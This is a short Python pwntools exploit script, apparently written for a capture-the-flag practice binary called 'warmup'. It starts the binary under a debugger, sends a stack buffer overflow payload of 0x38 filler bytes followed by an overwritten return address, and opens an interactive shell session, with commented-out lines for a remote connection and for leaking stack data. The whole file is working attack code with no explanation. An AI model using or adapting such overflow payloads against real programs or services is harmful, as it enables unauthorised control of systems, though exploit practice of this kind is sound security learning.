#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./warmup',checksec=False)
context.terminal = "tmux splitw -h".split(" ")
#s = process('socat TCP-LISTEN:9999,reuseaddr,fork EXEC:./warmup,pty,setsid,sigint,sane,rawer'.split())
#p = remote('127.0.0.1', 10001)
p = process(elf.path)
gdb.attach(p)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
vuln = 0x40053d
write = 0x4004a0
read = 0x4004b0
ret = 0x000000000040057d

payload = b'A'*0x38  + p64(0x40055d)
p.sendafter(b'> ', payload)
#p.recvuntil(b'A'*0x30)
#data = p.recv().strip()
#data = [hex(u64(data[i:i+8])) for i in range(0, len(data), 8)]
#print(data)
p.interactive()
